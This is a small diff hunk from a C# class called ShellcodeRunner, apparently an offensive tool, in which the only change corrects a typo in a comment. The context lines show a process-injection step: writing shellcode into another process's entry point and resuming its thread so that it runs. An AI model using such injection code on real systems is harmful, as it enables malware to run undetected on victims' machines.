@@ -151,7 +151,7 @@ public class ShellcodeRunner
         // Write shellcode to the entry point
         Utility.WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, ref nRead);
 
-        // Resume thread to xecute shellcode
+        // Resume thread to execute shellcode
         Utility.ResumeThread(pi.hThread);
     }
 
